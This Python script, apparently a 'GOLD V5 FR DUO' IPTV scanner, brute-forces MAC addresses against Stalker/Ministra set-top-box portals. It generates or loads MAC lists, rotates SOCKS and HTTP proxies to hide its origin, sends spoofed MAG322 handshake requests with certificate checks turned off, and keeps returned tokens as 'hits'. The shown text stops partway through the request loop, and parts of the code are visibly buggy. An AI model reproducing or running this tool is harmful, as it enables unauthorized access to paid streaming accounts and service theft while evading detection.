import sys, os
NOME = 'GOLD V5 FR DUO '
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import random, time, datetime
import subprocess
import json, sys, re
import pathlib
import threading
import os
import platform	
import urllib.request
import os
import pip
import datetime
import os
import socket
import hashlib
import json
import random
import sys
import time
import re
import marshal
import subprocess
import base64
import pathlib
import threading
import codecs
import logging
from colorama import Fore, Back, Style
from playsound import playsound
try:
	from playsound import playsound#import requests
except:
	print("requests module is not installed \n loading requests module \n")
	pip.main(['install', 'playsound'])
 
os.system('cls' if os.name == 'nt' else 'clear')

my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os="WINDOWS"
else:
    rootDir = "/sdcard/"
    my_os="ANDROID"
my_cpu = platform.machine()
my_py = platform.python_implementation()
print("My OS is: :", my_os+"")


if not os.path.exists('/sdcard/sounds'):
    os.makedirs('/sdcard/sounds')
if not os.path.exists('./sounds'):
    os.makedirs('./sound')
if os.path.exists("/sdcard/sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3"):
    os.remove("/sdcard/sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3")
if os.path.exists("./sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3"):
    os.remove("./sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3")
print("\33[1;92m\n         Downloading Please Wait... \33[0m")
url="http://soundfxcenter.com/video-games/call-of-duty/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3"
urllib.request.urlretrieve(url, "/sdcard/sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3")
urllib.request.urlretrieve(url, "./sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3")
print("\n \33[1;93m     Sound DOWNLOAD SUCCESSFUL     \33[0m")

nickn=""
white=("""\033[1;93m\n""") 
if nickn=="":
	nickn=input("""\n
\33[36m\33[1m           Enter your nick name:      
 If nothing is written, then name "NOBODY"
 will be automatically written to HiTS.FiLE\33[0m
\33[96m\33[1m      Pres ENTER or writte your Nick:
      = \x1b[38;5;1m\33[1m""")
if nickn == '':
    nickn = 'NOBODY'
import os
os.system('cls' if os.name == 'nt' else 'clear')
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
import pathlib

try:
	import requests
except:
	print("requests module is not loaded\nrequests module is being loaded\n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock module is not loaded\ne sock module is being loaded\n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
import requests, json, unicodedata, os, sys, re
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
os.system('cls' if os.name == 'nt' else 'clear')
ses= requests.Session()

try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()


oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses= requests.Session()



say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
prox=0
cpm=1

def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)
a("""
\033[0;91m▬▬▬ My Os➢ """+my_os+""" ▬▬▬ \33[0m     

\033[0;91m▬▬▬ My Cpu➢ """+str(my_cpu)+""" ▬▬▬ \33[0m   

\033[0;91m▬▬▬ My Py➢ """+my_py+""" ▬▬▬ \33[0m    

\33[1;92m▬▬▬ GOLD V5 FR DUO PY ▬▬▬ \33[0m
       
\33[1;92m▬▬▬ 🇵🇹 NEW BEST IPTV TEAMS 🇱🇺 ▬▬▬ \33[0m

\33[1;93m▬▬▬ MES AMITIERS ▬▬▬ \33[0m

\33[1;93m▬▬▬ PAPY GOGO ▬▬▬ \33[0m

\33[1;93m▬▬▬ ENJOY FOR FREE!!! ▬▬▬ \33[0m """)
time.sleep(1)



macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""\33[33;7m ★     ★     ★   GOLD V5 FR DUO PY  ★     ★     ★    \33[0m

\033[38;5;229m     █▀█ ▄▀█ █▀█ █▄█   █▀▀ █▀█ █▀▀ █▀█      
\033[38;5;94m     █▀▀ █▀█ █▀▀ ░█░   █▄█ █▄█ █▄█ █▄█                                                                                                                    

\033[38;5;94m                ╔══╗
\033[38;5;229m                ╚╗╔╝
\033[38;5;94m                ╔╝\33[38;5;160m(¯`v´¯)    \33[0m
\033[38;5;229m                ╚══\33[38;5;160m`.¸.\33[0mᴘʏᴛʜᴏɴ    \33[0m 

\33[33;7m ★     ★     ★   GOLD V5 FR DUO PY  ★     ★     ★    \33[0m

\033[38;5;94m  ☛ NEW BEST IPTV TEAMS FUCK YOU 💯 🇵🇹 🇱🇺 ☚         \33[0m

""")

print(feyzo) 
kisacikti=""
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='PRL'
bekleme=1

print(feyzo) 
panel = input("""
\33[1;91m1=portal.php (White Panel UserAgent) \33[0m
\33[1;91m2=portal.php (White Cnf) \33[0m 
\33[1;91m3=portal.php (White Ultra) \33[0m
\33[1;92m4=portal.php (Real Blue)  \33[0m 
\33[1;92m5=server/load.php (Real Blue)  \33[0m
\33[1;92m6=server/load.php (Panel:Port écrire directement) \33[0m
\33[1;93m7=stalker_portal \33[0m
\33[1;93m8=xUi /c/server/load.php \33[0m
\33[1;93m9=xUi /c/portal.php \33[0m
\33[1;91m10=bs.mag.portal \33[0m
\33[1;91m11=portalcc.php \33[0m
\33[1;91m12=magLoad.php \33[0m
\33[1;92m13=ministra/portal.php \33[0m
\33[1;92m14=magportal/portal.php \33[0m
\33[1;92m15=powerfull/portal.php  \33[0m
\33[1;93m16=portalstb/portal.php \33[0m
\33[1;93m17=magaccess/portal.php \33[0m
\33[1;93m18=Link_Ok/portal.php \33[0m
\33[1;91m19=client/portal.php \33[0m
\33[1;91m20=delko/portal.php  \33[0m
\33[1;91m21=p/portal.php   \33[0m
\33[1;92m22=blowportal/portal.php  \33[0m 
\33[1;92m23=portalmega/portal.php  \33[0m
\33[1;92m24=portalmega/portalmega.php \33[0m
\33[1;93m25=Je vais déterminer par moi-même \33[0m
			
\33[1;92mPanel:Port=\33[1;92m""")
print('\33[1;92m')



reddos="açık"
if panel =="q":
	reddos="kapat"
	print(feyzo) 
	panel = input("""

\33[1;91m1=portal.php (White Panel UserAgent) \33[0m
\33[1;91m2=portal.php (White Cnf) \33[0m 
\33[1;91m3=portal.php (White Ultra) \33[0m
\33[1;92m4=portal.php (Real Blue)  \33[0m 
\33[1;92m5=server/load.php (Real Blue)  \33[0m
\33[1;92m6=server/load.php (Panel:Port écrire directement) \33[0m
\33[1;93m7=stalker_portal \33[0m
\33[1;93m8=xUi /c/server/load.php \33[0m
\33[1;93m9=xUi /c/portal.php \33[0m
\33[1;91m10=bs.mag.portal \33[0m
\33[1;91m11=portalcc.php \33[0m
\33[1;91m12=magLoad.php \33[0m
\33[1;92m13=ministra/portal.php \33[0m
\33[1;92m14=magportal/portal.php \33[0m
\33[1;92m15=powerfull/portal.php  \33[0m
\33[1;93m16=portalstb/portal.php \33[0m
\33[1;93m17=magaccess/portal.php \33[0m
\33[1;93m18=Link_Ok/portal.php \33[0m
\33[1;91m19=client/portal.php \33[0m
\33[1;91m20=delko/portal.php  \33[0m
\33[1;91m21=p/portal.php   \33[0m
\33[1;92m22=blowportal/portal.php  \33[0m 
\33[1;92m23=portalmega/portal.php  \33[0m
\33[1;92m24=portalmega/portalmega.php \33[0m
\33[1;93m25=Je vais déterminer par moi-même \33[0m

\33[1;92mPanel:Port=\33[1;92m""")
print('\33[1;92m')

uzmanc=""
uzmanm="server/load.php"
useragent="okhttp/4.7.1"
if len(panel)==1 or len(panel)==2:# panel=="1":
    


    uzmanm=panel
    print(uzmanm)
    if uzmanm=="25":
    	uzmanm=input("reply=")
    if  uzmanm=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	
    if uzmanm=="2":
    	uzmanm="portal.php"
    	uzmanc="portal"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" 
    if uzmanm=="3":
    	uzmanm="portal.php"
    	uzmanc="ultra"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    if uzmanm=="4":
    	uzmanm="portal.php"
    	uzmanc="realblue"
   
    if uzmanm=="5":
    	uzmanm="server/load.php"
    	uzmanc="realblue"
    	
    if uzmanm=="" or uzmanm=="6":
    	uzmanm="server/load.php"
    if uzmanm=="7":
    	uzmanm="stalker_portal/server/load.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="stalker"
    if uzmanm=="8":
    	uzmanm="c/server/load.php"
    if uzmanm=="9":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    if uzmanm=="10":
    	uzmanm="bs.mag.portal.php"
    if uzmanm=="11":
    	uzmanm="portalcc.php"
    if uzmanm=="12":
    	uzmanm="magLoad.php"
    if uzmanm=="13":
    	uzmanm="ministra/portal.php"
    if uzmanm=="14":
    	uzmanm="magportal/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="magportal"
    if uzmanm=="15":
    	uzmanm="powerfull/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="powerfull"
    if uzmanm=="16":
    	uzmanm="portalstb/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="portalstb"
    if uzmanm=="17":
    	uzmanm="magaccess/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="magaccess"
    if uzmanm=="18":
    	uzmanm="Link_Ok.php"
    	uzmanc="Link_OK"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    if uzmanm=="19":
    	uzmanm="client/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="client"
    if uzmanm=="20":
    	uzmanm="delko/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="delko"
    if uzmanm=="21":
    	uzmanm="p/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="p"
    if uzmanm=="22":
    	uzmanm="blowportal/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="blowportal"
    if uzmanm=="23":
    	uzmanm="portalmega/portal.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="portalmega"
    if uzmanm=="24":
    	uzmanm="portalmega/portalmega.php"
    	useragent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    	uzmanc="portalmega"
    if uzmanm=="x":
    	bekleme=input(int("Type the Wait Time in Seconds.\nSeconds="))
    	uzmanm="server/load.php"
    if uzmanm=="z":
    		kisacikti="1"
    		uzmanm="server/load.php"   
    				

    print(feyzo) 
    panel = input("""
\33[1;92mExample panel name = myf-tv.com:8080\n
	\33[1;92mPlease write the name of the sign.. ?
	
	
\33[1;92mPanel:URL=\33[1;92m""")
#print(panel.split('/')[3])

if bekleme=="":
	bekleme=1
else:
	bekleme=int(bekleme)
try:
	if panel.split('/')[3] =='stalker_portal':
		uzmanm="stalker_portal/server/load.php"
		panel=panel.replace('/stalker_portal','')
		uzmanc='stalker'
except:pass
print(panel)
#	print(panel)#http://z.zcatt.cc/stalker_portal/c/

print("\33[1;40m"+feyzo) 
kanalkata="0"
kanalkata=input("""\33[1;40m
\33[1;93mdo you want to include channel categories

\33[1;93m0=addition
\33[1;93m1=Live channel category only
\33[1;93m2=Add all (Live-VOD SERIES)

\33[1;93mChoose=""")




print(feyzo) 

combo=input("""
\33[1;91m	Select scan type..!
\33[1;91m1=Combo List
\33[1;91m2=Random combo

 \33[1;91mChoose=""" )

print(feyzo) 
totLen="000000"
if combo=="1":
 	say=0
 	dsy=""
 	dir=rootDir+'combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"= "+files+'\n'
 	print ("""\33[1;92mChoose your combo from the list below!!!
"""+dsy+"""
\33[1;92min your combo folder """ +str(say)+""" file found!
	""")
 	dsyno=str(input(" \33[1;92mCombo No =\33[1;92m"))
 	say=0
 	for files in os.listdir (dir):
 			say=say+1
 			if dsyno==str(say):
 				dosyaa=(dir+files)
 	say=0
 	print(dosyaa) 
 	c=open(dosyaa, 'r')
 	
 	totLen=c.readlines()

 	print(feyzo) 
 	baslama=""
 	baslama=input("""
\33[1;93mIn the selected combo file \33[1;93m"""+str(len(totLen))+"""\33[1;93m Les Mac sont prévus.
 
\33[1;93mIf you want to change the initial combo scan order

\33[1;93mYes = Write the line number.
\33[1;93mNo = Without any line number

\33[1;93mChoose=""")
 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		

print(feyzo)  	
if combo=="1":
	print("\n\n\33[1;91mSo that it can continue scanning when your combo's Mac is low.")
	
macyazi=("""
\33[1;91mSelect combination type Mac...?\33[0m
\33[1;91mNormal Macs = \33[1;91m1
\33[1;91mRandom Macs = \33[1;91m2

\33[1;91m\33[1mType Mac combo type =\33[1;91m""")
macturu=input(macyazi)
if macturu=="":
	macturu="2"
#################
#print("\nA scanner Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"


print(feyzo)  	

Macs = input("""\33[1;92m
\33[1;92mIf you don't want to choose the match type, leave it blank...

\33[1;92m	0 = Do a functional MAC test

\33[1;92m	1= 00:1A:79: (Default)
\33[1;92m	2= 10:27:BE:
\33[1;92m	3= 33:44:CF:
\33[1;92m	4= A0:BB:3E:
\33[1;92m	5= je vais me déterminer ...
	
\33[1;92mType no to change the Mac type...

\33[1;92mChoose=""") 
#\33[33mUtiliser un Mac série?
#\33[1m\33[34mOui (1) \33[0m Non \33[1m\33[32mHayır (2) \33[0m Yazınız!! 


if Macs=="0":
	macSayisi=1#int(input("Denecek mac sayısı =")) 
	ozelmac=input("Working MAC Address=")
dmac=""
if not  Macs=="0":
	dmac=Macs#input("""
#Default Mac Türü
#	1= 00:1A:79:
#	2= 10:27:BE:
#	3= 33:44:CF
#	4= I will reveal myself...
#	""")
	if dmac=="" or dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[1;92m\nUtiliser un Using a serial Mac? \nChoose \33[1m\33[32mOui (1) \33[1;92m Non \33[1m\33[32m (2) \33[32m écrire!! =") 

	if dmac=="2":
		MacCombo="10:27:BE:"
		Macs = input("\33[1;92m\nUtiliser un Mac série? \nChoose \33[1m\33[32mOui (1) \33[1;92m Non \33[1m\33[32m (2) \33[32m écrire!! =") 

	if dmac=="3":
		MacCombo="33:44:CF:"
		Macs = input("\33[1;92m\nUtiliser un Mac série? \nChoose \33[1m\33[32mOui (1) \33[1;92m Non \33[1m\33[32m (2) \33[32m écrire!! =") 

	if dmac=="4":
		MacCombo="A0:BB:3E:"
		Macs = input("\33[1;92m\nUtiliser un Mac série? \nChoose \33[1m\33[32mOui (1) \33[1;92m Non \33[1m\33[32m (2) \33[32m écrire!! =") 
		
	if dmac=="5":
		MacCombo=input("écrire the first three match types...")
		Macs = input("\33[1;92m\nUtiliser un Mac série? \nChoose \33[1m\33[32mOui (1) \33[1;92m Non \33[1m\33[32m (2) \33[32m écrire!! =") 


if Macs[:1]=="e" or Macs[:1]=="E"  or Macs=="1":
    Seri=input("Sample="+MacCombo+"\33[31m5\33[0m\nsample="+MacCombo+"\33[31mfa\33[32m\nécrire two values in one!!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
   # Seri=Seri[:2]
    #MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo

print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
#panel="titan.panel.tm"


if panel=="" :
    exit() 
#if len(mm)==6:
#	turet=6
#	MacCombo=MacCombo+":"
#if len(mm)==7:
#	turet=5
#if len(mm)==8:
#	turet=4
#	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       

print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
bad=0
proxies=""
proxi=input("""
\33[33mVoulez-vous utiliser des proxys..!
\33[33m1 - Oui
\33[33m2 - Non

\33[33m1 Yes or 2 No Choose =\33[33m""")

print(feyzo) 
if proxi =="1":
	say=0
	dsy=""
	dir=rootDir+'proxy/'
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""
\33[33mChoisissez votre combo dans la liste ci-dessous!!!
"""+dsy+"""
\33[33mdans votre dossier combo """ +str(say)+"""\33[33m fichier trouvé!
\33[33mVeuillez sélectionner votre fichier Proxy Socks5...!
	""")
	dsyno=str(input(" \33[33mCombo No =\33[33m"))
	say=0
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	proxies=""
	print(dosyaa) 
	Proxy=dosyaa
	c=open(Proxy,'r')
	sock=c.readlines()
	prox=0
	Proxy=dosyaa
	
	print(feyzo) 
	pro=input("""
\33[32mQuel est le type de proxy dans le fichier que vous avez sélectionné?
\33[32m	1 - ipVanish Socks5
\33[32m	2 - free Socks4 
\33[32m	3 - free Socks5
\33[32m	3 - free http
\33[32m		Proxy Type=\33[32m""")

print(feyzo)
hits=rootDir+'Hits/GOLD V5 DUO/'
if not os.path.exists(hits):
    os.mkdir(hits)


Dosyab=hits +panel.replace(":","_").replace('/','') +" GOLD V5 DUO.txt"
say=1
def yaz(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()	

print(feyzo) 
macaddres=MacCombo
	
for mag in range(16**6):
	oto=""
	macr=""
	tur=0
	hex_num = hex(mag)[2:].zfill(6)
	genmac = MacCombo+"%02X:%02X:%02X"% (random.randint(0 , 256),random.randint(0, 256),random.randint(0, 256))
	genmac=genmac.replace(':100',':10')
#	print(Seri)
	if len(Seri) ==1:
	   genmac=str(genmac).replace(str(genmac[:10]),macaddres+Seri)
	if len(Seri)==2:
	   genmac=str(genmac).replace(str(genmac[:11]),macaddres+Seri)
	macr=(genmac)
	s=s+1
	if s ==16:
		ss=ss+1
		s=0
	if ss ==16:
		sss=sss+1
		ss=0
		s=0
	if sss==16:
		ssss=ssss+1
		sss=0
		ss=0
		s=0
	if ssss==16:
		sd=sd+1
		ssss=0
		sss=0
		ss=0
		s=0		
	if sd==16:
		sdd=sdd+1
		sd=0
		sss=0
		ss=0
		s=0

	if sdd==16:
		sdd=0
		sd=0
		sss=0
		ss=0
		s=0
	
	seri1=a[sdd]
	seri2=a[sd]
	#print(Seri)
	if not Seri=="":
		if len(Seri)==1:
			seri1=Seri[0]
			
		if len(Seri)==2:
			seri1=Seri[0]
			seri2=Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	#print(maca)
	if macturu =="1":
		mac=mac=MacCombo+maca
	else:
		mac=macr
	
		
		
	
	
	
	#macs=mac.replace(':','%3A')
	#mac=mac.upper()
	combo=combo
	if combo=="1":
		#print(combo)
		if len(totLen)-2 > csay:
			#print(combo)
			while True:
			    # print(csay)
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	#print("######")
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		mac=mac.upper() 
			     		mac=mac.replace('00:1A:79',MacCombo)
			     	break
	
	
	if not ozelmac=="":
		mac=ozelmac
	#mac="00:1a:79:67:e9:19"
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	
	macs=mac.upper().replace(':','%3A')
	

		
	HEADERA={
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FIstanbul;",
"Referer": "http://"+panel+"/c/",
"X-User-Agent":"Model: MAG322; Link: Ethernet",
"Accept": "*/*",
"Connection": "Keep-Alive",
"Host": panel.replace('/stalker_portal',''),
"Accept-Encoding": "gzip",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" ,
	}	
	#print(HEADERA)
	url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	#print(url1)
	#print(panel)
	token=""
	veri=""
	#print(url1)
	
	
	if proxi =="1":
			if prox==len(sock)-2:
				prox=0
			#print("evet")
			if pro=="1":
					#print("1")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							#print(prox)
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							pip=pveri.split(':')[0]
							pport=pveri.split(':')[1]
							pname=pveri.split(':')[2]
							ppass=pveri.split(':')[3]
							proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,
							'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
							print('\33[33mSocks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad)+"\33[0m" )
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(req.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
			if pro=="2":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks4://'+pip+':'+pport,
						'https':'socks4://'+pip+':'+pport}
							print('Socks4 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
	
			if pro=="3":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks5://'+pip+':'+pport,
						'https':'socks5://'+pip+':'+pport}
							print('Socks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass

			if pro=="4":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'http://'+pip+':'+pport,
						'https':'http://'+pip+':'+pport}
							print('Http Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass		
	
	

	
#	try:
	else:
		bag1=0
		while True:
			try:
				res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
				veri=str(res.text)
				break
			except:pass
				#bag1=bag1+1
#				time.sleep(bekleme)
				#if bag1==4:
#					quit()
		bag1=0
					
		veri=str(res.text)
		
	if 1==1:
            renk="\33[0m"
            if 'token' in veri:
            	token=veri.replace('{"js":{"token":"',"")
            	token=token.split('"')[0]
            	#token=token.replace('"}}',"")
            	#print(token)
            	renk="\33[0m"
